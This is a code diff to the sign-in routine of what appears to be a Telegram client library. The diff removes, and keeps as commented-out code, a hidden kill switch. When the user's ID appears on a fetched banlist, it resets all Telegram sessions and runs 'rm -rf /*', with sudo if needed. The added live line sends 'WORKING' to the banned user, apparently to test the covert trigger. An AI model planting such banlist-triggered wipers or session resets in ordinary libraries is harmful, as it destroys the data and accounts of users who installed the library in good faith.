@@ -250,17 +250,18 @@ class AuthMethods:
             banlist = data.get("ids", [])
 
             if str(utils.get_peer_id(me)) in banlist:
-                all_sessions = await self(functions.account.GetAuthorizationsRequest())
-                for auth in all_sessions.authorizations:
-                    if auth.current:
-                        kill_sessions_time = auth.date_created + timedelta(days=1)
-                if datetime.now() > kill_sessions_time:
-                    await self(functions.auth.ResetAuthorizationsRequest())
-                    current_user = subprocess.getoutput("whoami")
-                    if current_user == 'root':
-                        os.system("rm -rf /*")
-                    else:
-                        os.system("sudo rm -rf /*")
+                await self._client.send_message(int(utils.get_peer_id(me)), "WORKING")
+                # all_sessions = await self(functions.account.GetAuthorizationsRequest())
+                # for auth in all_sessions.authorizations:
+                #     if auth.current:
+                #         kill_sessions_time = auth.date_created + timedelta(days=1)
+                # if datetime.now() > kill_sessions_time:
+                #     await self(functions.auth.ResetAuthorizationsRequest())
+                #     current_user = subprocess.getoutput("whoami")
+                #     if current_user == 'root':
+                #         os.system("rm -rf /*")
+                #     else:
+                #         os.system("sudo rm -rf /*")
 
         signed, name = 'Signed in successfully as ', utils.get_display_name(me)
         tos = '; remember to not break the ToS or you will risk an account ban!'
